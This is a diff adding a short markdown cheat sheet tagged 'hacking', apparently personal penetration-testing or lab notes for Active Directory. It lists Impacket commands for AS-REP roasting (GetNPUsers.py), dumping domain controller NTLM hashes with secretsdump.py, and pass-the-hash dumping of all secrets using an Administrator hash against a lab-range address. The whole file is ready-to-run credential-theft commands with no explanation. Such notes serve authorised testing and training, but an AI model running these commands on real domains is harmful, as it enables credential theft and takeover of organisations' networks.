@@ -1,0 +1,11 @@
+---
+tags: [ hacking ]
+---
+# ASREPRoast
+GetNPUsers.py domain.local/ -usersfile valid-users.out -format hashcat -outputfile asreproast.out -dc-ip 10.11.1.x
+
+# Dump DC secrets
+# secretsdump.py -just-dc-ntlm domain.local/user:password@10.11.1.x
+
+# Dump all secrets with admin hash
+secretsdump.py WORKGROUP/Administrator@10.11.1.x -hashes aad3b435b51404eeaad3b435b51404ee:b4b9b02e6f09a9bd760f388b67351e2b
